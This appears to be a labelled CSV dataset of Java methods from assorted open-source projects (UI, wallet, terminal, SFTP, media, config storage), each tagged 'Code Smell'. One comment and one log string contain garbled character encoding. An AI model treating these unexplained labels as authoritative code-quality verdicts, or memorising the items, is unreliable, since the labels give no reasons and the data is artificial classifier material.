text,label,text_label
"/** 
 * Most tiny ui has 8 cards in a row or 24 in grid.
 */
public void shouldContinueTheGroup(Context context,VideoGroup group,Runnable onNeedContinue,boolean isGrid){
  if (shouldContinueTheGroup(context,group,isGrid) && onNeedContinue != null) {
    onNeedContinue.run();
  }
}
/** 
 * Most tiny ui has 8 cards in a row or 24 in grid.
 */
public boolean shouldContinueTheGroup(Context context,VideoGroup group,boolean isGrid){
  if (group == null || group.getMediaGroup() == null) {
    return false;
  }
  MediaGroup mediaGroup=group.getMediaGroup();
  Pair<Integer,Long> sizeTimestamp=mContinuations.get(group.getId());
  long currentTimeMillis=System.currentTimeMillis();
  if (sizeTimestamp != null && currentTimeMillis - sizeTimestamp.second > 3_000) {
    sizeTimestamp=null;
  }
  int prevSize=sizeTimestamp != null ? sizeTimestamp.first : 0;
  int newSize=mediaGroup.getMediaItems() != null ? mediaGroup.getMediaItems().size() : 0;
  int totalSize=prevSize + newSize;
  MainUIData mainUIData=MainUIData.instance(context);
  boolean isScaledUIEnabled=mainUIData.getUIScale() < 0.8f || mainUIData.getVideoGridScale() < 0.8f;
  int minScaledSize=isGrid ? MIN_SCALED_GRID_GROUP_SIZE : MIN_SCALED_ROW_GROUP_SIZE;
  int minSize=isGrid ? MIN_GRID_GROUP_SIZE : MIN_ROW_GROUP_SIZE;
  boolean groupTooSmall=isScaledUIEnabled ? totalSize < minScaledSize : totalSize < minSize;
  mContinuations.put(group.getId(),new Pair<>(groupTooSmall ? totalSize : 0,currentTimeMillis));
  return groupTooSmall;
}",1,Code Smell
"private boolean isConflicted(ListTransaction listTransaction,Map<String,Boolean> conflictCache){
  if (listTransaction.confirmations() == 0 && !listTransaction.walletconflicts().isEmpty()) {
    Boolean active=conflictCache.computeIfAbsent(listTransaction.txid(),txid -> {
      try {
        getBitcoindService().getMempoolEntry(txid);
        return true;
      }
 catch (      JsonRpcException e) {
        return false;
      }
    }
);
    if (active) {
      for (      String conflictedTxid : listTransaction.walletconflicts()) {
        conflictCache.put(conflictedTxid,false);
      }
    }
    return !active;
  }
 else {
    return listTransaction.confirmations() < 0;
  }
}",1,Code Smell
"public static ByteBuffer getByteBuffer(PtNDArray ndArray,boolean tryDirect){
  if (!ndArray.getDevice().equals(Device.cpu())) {
    ndArray=ndArray.toDevice(Device.cpu(),false);
  }
  if (tryDirect) {
    if (ndArray.isSparse() || getLayout(ndArray) == 2 || !PyTorchLibrary.LIB.torchIsContiguous(ndArray.getHandle())) {
      ndArray=new PtNDArray(ndArray.getManager(),PyTorchLibrary.LIB.torchToContiguous(ndArray.getHandle()));
    }
    return PyTorchLibrary.LIB.torchDirectByteBuffer(ndArray.getHandle()).order(ByteOrder.nativeOrder());
  }
  return ByteBuffer.wrap(PyTorchLibrary.LIB.torchDataPtr(ndArray.getHandle())).order(ByteOrder.nativeOrder());
}",1,Code Smell
"@Override public void mouseClicked(MouseEvent e){
  if (e.getSource() == btnClose) {
    if (frame instanceof FrameMain && SysTray.isSysTrayInitiated() && Global.closeToSystray) {
      Logger.println(""最小化到系统托盘"");
      frame.setExtendedState(JFrame.ICONIFIED);
      frame.setVisible(false);
    }
 else {
      if (frame instanceof FrameMain && Global.downloadTab.activeTask > 0) {
        Object[] options={""我要退出"",""我再想想""};
        String msg=String.format(""当前仍有 %d 个任务在下载/转码，正在转码的文件退出后可能丢失或异常，确定要退出吗？"",Global.downloadTab.activeTask);
        int m=JOptionPane.showOptionDialog(null,msg,""警告"",JOptionPane.YES_NO_OPTION,JOptionPane.PLAIN_MESSAGE,null,options,options[0]);
        Logger.println(m);
        if (m != 0)         return;
      }
      Logger.println(""closing..."");
      WindowEvent event=new WindowEvent(frame,WindowEvent.WINDOW_CLOSING);
      frame.dispatchEvent(event);
    }
  }
 else   if (e.getSource() == btnMin) {
    frame.setExtendedState(JFrame.ICONIFIED);
    if (frame instanceof FrameMain && SysTray.isSysTrayInitiated() && Global.minimizeToSystray) {
      Logger.println(""最小化到系统托盘"");
      frame.setVisible(false);
    }
  }
}",1,Code Smell
"@Override public ErrorCode destroyChannel(String operator,String channelId,boolean isAdmin){
  HazelcastInstance hzInstance=m_Server.getHazelcastInstance();
  IMap<String,WFCMessage.ChannelInfo> mIMap=hzInstance.getMap(CHANNELS);
  WFCMessage.ChannelInfo oldInfo=mIMap.get(channelId);
  if (oldInfo == null) {
    return ErrorCode.ERROR_CODE_NOT_EXIST;
  }
  if ((oldInfo.getOwner() == null || !oldInfo.getOwner().equals(operator)) && !isAdmin) {
    return ErrorCode.ERROR_CODE_NOT_RIGHT;
  }
  WFCMessage.ChannelInfo.Builder newInfoBuilder=oldInfo.toBuilder();
  newInfoBuilder.setStatus(oldInfo.getStatus() | Channel_State_Mask_Deleted);
  newInfoBuilder.setUpdateDt(System.currentTimeMillis());
  mIMap.put(channelId,newInfoBuilder.build());
  databaseStore.clearChannelListener(channelId);
  hzInstance.getMultiMap(CHANNEL_LISTENERS).remove(channelId);
  callbackChannelInfoUpdateEvent(operator,channelId,Channel_Event_Destroy);
  return ErrorCode.ERROR_CODE_SUCCESS;
}
",1,Code Smell
"@Nullable public Config getInitConfig(){
  Config config=initConfig.get(INITNAME);
  if (config != null && config.getVersion() != null && config.getVersion() < Constant.PLUGIN_CONFIG_VERSION_3) {
    if (URLUtils.leetcodecnOld.equals(config.getUrl())) {
      config.setUrl(URLUtils.leetcodecn);
    }
    Iterator<String> iterator=config.getUserCookie().keySet().iterator();
    while (iterator.hasNext()) {
      String key=iterator.next();
      String value=config.getCookie(key);
      if (StringUtils.isBlank(value) || key.startsWith(URLUtils.leetcodecnOld)) {
        iterator.remove();
      }
    }
    config.setVersion(Constant.PLUGIN_CONFIG_VERSION_3);
    setInitConfig(config);
  }
  return config;
}",1,Code Smell
"@Override public void mouseClicked(final MouseEvent e){
  requestFocusInWindow();
  Runnable hyperlink=findHyperlink(e.getPoint());
  if (hyperlink != null && (myCursorType == Cursor.HAND_CURSOR)) {
    hyperlink.run();
  }
 else   if (e.getButton() == MouseEvent.BUTTON1 && isLocalMouseAction(e)) {
    int count=e.getClickCount();
    if (count == 1) {
    }
 else     if (count == 2) {
      final Point charCoords=panelToCharCoords(e.getPoint());
      Point start=SelectionUtil.getPreviousSeparator(charCoords,myTerminalTextBuffer);
      Point stop=SelectionUtil.getNextSeparator(charCoords,myTerminalTextBuffer);
      mySelection=new TerminalSelection(start);
      mySelection.updateEnd(stop);
      if (mySettingsProvider.copyOnSelect()) {
        handleCopyOnSelect();
      }
    }
 else     if (count == 3) {
      final Point charCoords=panelToCharCoords(e.getPoint());
      int startLine=charCoords.y;
      while (startLine > -getScrollBuffer().getLineCount() && myTerminalTextBuffer.getLine(startLine - 1).isWrapped()) {
        startLine--;
      }
      int endLine=charCoords.y;
      while (endLine < myTerminalTextBuffer.getHeight() && myTerminalTextBuffer.getLine(endLine).isWrapped()) {
        endLine++;
      }
      mySelection=new TerminalSelection(new Point(0,startLine));
      mySelection.updateEnd(new Point(myTermSize.width,endLine));
      if (mySettingsProvider.copyOnSelect()) {
        handleCopyOnSelect();
      }
    }
  }
 else   if (e.getButton() == MouseEvent.BUTTON2 && mySettingsProvider.pasteOnMiddleMouseClick() && isLocalMouseAction(e)) {
    handlePasteSelection();
  }
 else   if (e.getButton() == MouseEvent.BUTTON3) {
    if (mySettingsProvider.pasteOnMiddleMouseClick() && isLocalMouseAction(e)) {
      handlePasteSelection();
    }
 else {
      JPopupMenu popup=createPopupMenu();
      popup.show(e.getComponent(),e.getX(),e.getY());
    }
  }
  repaint();
}",1,Code Smell
"public void checkLock(){
  checkLock(-1);
}
@WorkerThread private void checkLock(int delayIndex){
  KeyguardManager keyguardManager=(KeyguardManager)mContext.getSystemService(Context.KEYGUARD_SERVICE);
  PowerManager powerManager=(PowerManager)mContext.getSystemService(Context.POWER_SERVICE);
  final boolean isProtected=keyguardManager.isKeyguardSecure();
  final boolean isLocked=keyguardManager.isKeyguardLocked();
  final boolean isInteractive=powerManager.isInteractive();
  delayIndex=getSafeCheckLockDelay(delayIndex);
  Log.i(TAG,""checkLock: isProtected=%b, isLocked=%b, isInteractive=%b, delay=%d"",isProtected,isLocked,isInteractive,sCheckLockDelays[delayIndex]);
  if (mCheckLockTask != null) {
    Log.i(TAG,""checkLock: cancelling CheckLockTask[%x]"",System.identityHashCode(mCheckLockTask));
    mCheckLockTask.cancel();
  }
  if (isProtected && !isLocked && !isInteractive) {
    mCheckLockTask=new CheckLockTask(delayIndex);
    Log.i(TAG,""checkLock: scheduling CheckLockTask[%x] for %d ms"",System.identityHashCode(mCheckLockTask),sCheckLockDelays[delayIndex]);
    mTimer.schedule(mCheckLockTask,sCheckLockDelays[delayIndex]);
  }
 else {
    Log.d(TAG,""checkLock: no need to schedule CheckLockTask"");
    if (isProtected && isLocked) {
      if (mRunnable != null) {
        mRunnable.run();
      }
    }
  }
}",1,Code Smell
"private FileInfo resolveSymlink(String name,String pathToResolve,FileAttributes attrs,String longName) throws Exception {
  try {
    System.out.println(""Following symlink: "" + pathToResolve);
    while (true) {
      String str=sftp.readlink(pathToResolve);
      System.out.println(""Read symlink: "" + pathToResolve + ""=""+ str);
      pathToResolve=str.startsWith(""/"") ? str : PathUtils.combineUnix(pathToResolve,str);
      System.out.println(""Getting link attrs: "" + pathToResolve);
      attrs=sftp.stat(pathToResolve);
      if (attrs.getType() != Type.SYMLINK) {
        FileInfo e=new FileInfo(name,pathToResolve,(attrs.getType() == Type.DIRECTORY ? -1 : attrs.getSize()),attrs.getType() == Type.DIRECTORY ? FileType.DirLink : FileType.FileLink,attrs.getMtime() * 1000,FilePermission.toMask(attrs.getPermissions()),PROTO_SFTP,getPermissionStr(attrs.getPermissions()),attrs.getAtime(),longName,name.startsWith("".""));
        return e;
      }
    }
  }
 catch (  SFTPException e) {
    if (e.getStatusCode() == Response.StatusCode.NO_SUCH_FILE || e.getStatusCode() == Response.StatusCode.NO_SUCH_PATH || e.getStatusCode() == Response.StatusCode.PERMISSION_DENIED) {
      return new FileInfo(name,pathToResolve,0,FileType.FileLink,attrs.getMtime() * 1000,FilePermission.toMask(attrs.getPermissions()),PROTO_SFTP,getPermissionStr(attrs.getPermissions()),attrs.getAtime(),longName,name.startsWith("".""));
    }
    throw e;
  }
catch (  Exception e) {
    e.printStackTrace();
    throw e;
  }
}",1,Code Smell
"@Override public void onSkipToPrevious(Player player,ControlDispatcher controlDispatcher){
  Timeline timeline=player.getCurrentTimeline();
  if (timeline.isEmpty() || player.isPlayingAd()) {
    return;
  }
  int windowIndex=player.getCurrentWindowIndex();
  timeline.getWindow(windowIndex,window);
  int previousWindowIndex=player.getPreviousWindowIndex();
  if (previousWindowIndex != C.INDEX_UNSET && (player.getCurrentPosition() <= MAX_POSITION_FOR_SEEK_TO_PREVIOUS || (window.isDynamic && !window.isSeekable))) {
    controlDispatcher.dispatchSeekTo(player,previousWindowIndex,C.TIME_UNSET);
  }
 else {
    controlDispatcher.dispatchSeekTo(player,windowIndex,0);
  }
}",1,Code Smell
"private void setIndexToPaintingOverlay(int index,PaintingOverlay paintingOverlay){
  if (paintingOverlay == null) {
    return;
  }
  paintingOverlay.reset();
  paintingOverlay.setVisibility(View.GONE);
  if (!imagesArrLocals.isEmpty() && index >= 0 && index < imagesArrLocals.size()) {
    Object object=imagesArrLocals.get(index);
    boolean isVideo=false;
    String paintPath=null;
    ArrayList<VideoEditedInfo.MediaEntity> mediaEntities=null;
    if (object instanceof MediaController.PhotoEntry) {
      MediaController.PhotoEntry photoEntry=(MediaController.PhotoEntry)object;
      isVideo=photoEntry.isVideo;
      paintPath=photoEntry.paintPath;
      mediaEntities=photoEntry.mediaEntities;
    }
 else     if (object instanceof MediaController.SearchImage) {
      MediaController.SearchImage photoEntry=(MediaController.SearchImage)object;
      paintPath=photoEntry.paintPath;
      mediaEntities=photoEntry.mediaEntities;
    }
    paintingOverlay.setVisibility(View.VISIBLE);
    paintingOverlay.setData(paintPath,mediaEntities,isVideo,false);
  }
}",1,Code Smell
"@Override public List<DeptVO> queryTreeList(QueryDeptListBO queryDeptListBO){
  Integer dataAuthType=adminService.queryDataType(UserUtil.getUserId(),MenuIdConstant.DEPT_MENU_ID).getData();
  List<DeptVO> deptVOList=new ArrayList<>();
  if (EmployeeHolder.isHrmAdmin() || dataAuthType.equals(DataAuthEnum.ALL.getValue())) {
    if (""tree"".equals(queryDeptListBO.getType()) || queryDeptListBO.getType() == null) {
      List<DeptVO> deptList=deptMapper.queryList(queryDeptListBO);
      if (StrUtil.isNotEmpty(queryDeptListBO.getName())) {
        List<HrmDept> list=lambdaQuery().select(HrmDept::getDeptId).like(HrmDept::getName,queryDeptListBO.getName()).list();
        for (        HrmDept dept : list) {
          deptVOList.addAll(createTree1(dept.getDeptId(),deptList));
        }
      }
 else {
        deptVOList=createTree(0,deptList);
      }
    }
    if (""update"".equals(queryDeptListBO.getType())) {
      List<HrmDept> deptList=list();
      deptVOList=deptList.stream().map(dept -> {
        DeptVO deptVO=new DeptVO();
        deptVO.setDeptId(dept.getDeptId());
        deptVO.setName(dept.getName());
        deptVO.setPid(dept.getPid());
        return deptVO;
      }
).collect(Collectors.toList());
      List<Integer> ids=RecursionUtil.getChildList(deptVOList,""pid"",queryDeptListBO.getId(),""deptId"",""deptId"");
      ids.add(queryDeptListBO.getId());
      deptVOList.removeIf(dept -> ids.contains(dept.getDeptId()));
    }
  }
 else {
    deptVOList=getDataAuthDeptList(queryDeptListBO,dataAuthType);
  }
  return deptVOList;
}",1,Code Smell
"/** 
 * 淇濆瓨閰嶇疆鏂囦欢锛屽苟缂撳瓨md5.
 */
static public boolean dump(String dataId,String group,String tenant,String content,long lastModifiedTs){
  String groupKey=GroupKey2.getKey(dataId,group,tenant);
  makeSure(groupKey);
  final int lockResult=tryWriteLock(groupKey);
  assert (lockResult != 0);
  if (lockResult < 0) {
    dumpLog.warn(""[dump-error] write lock failed. {}"",groupKey);
    return false;
  }
  try {
    final String md5=MD5.getInstance().getMD5String(content);
    if (md5.equals(ConfigService.getContentMd5(groupKey))) {
      dumpLog.warn(""[dump-ignore] ignore to save cache file. groupKey={}, md5={}, lastModifiedOld={}, "" + ""lastModifiedNew={}"",groupKey,md5,ConfigService.getLastModifiedTs(groupKey),lastModifiedTs);
    }
 else     if (!STANDALONE_MODE || PropertyUtil.isStandaloneUseMysql()) {
      DiskUtil.saveToDisk(dataId,group,tenant,content);
    }
    updateMd5(groupKey,md5,lastModifiedTs);
    return true;
  }
 catch (  IOException ioe) {
    dumpLog.error(""[dump-exception] save disk error. "" + groupKey + "", ""+ ioe.toString(),ioe);
    if (ioe.getMessage() != null) {
      String errMsg=ioe.getMessage();
      if (NO_SPACE_CN.equals(errMsg) || NO_SPACE_EN.equals(errMsg) || errMsg.contains(DISK_QUATA_CN)|| errMsg.contains(DISK_QUATA_EN)) {
        fatalLog.error(""纾佺洏婊¤嚜鏉�閫�鍑�"",ioe);
        System.exit(0);
      }
    }
    return false;
  }
 finally {
    releaseWriteLock(groupKey);
  }
}",1,Code Smell
"private void setElectrumServerInConfig(Config config){
  Server existingServer=config.getRecentElectrumServers().stream().filter(server -> electrumHost.getText().equals(server.getAlias())).findFirst().orElse(null);
  if (existingServer != null) {
    config.setElectrumServer(existingServer);
    return;
  }
  String hostAsString=getHost(electrumHost.getText());
  Integer portAsInteger=getPort(electrumPort.getText());
  if (hostAsString != null && !hostAsString.isEmpty() && portAsInteger != null && isValidPort(portAsInteger)) {
    config.setElectrumServer(new Server(getProtocol().toUrlString(hostAsString,portAsInteger)));
  }
 else   if (hostAsString != null && !hostAsString.isEmpty()) {
    config.setElectrumServer(new Server(getProtocol().toUrlString(hostAsString)));
  }
 else {
    config.setElectrumServer(null);
  }
}
",1,Code Smell
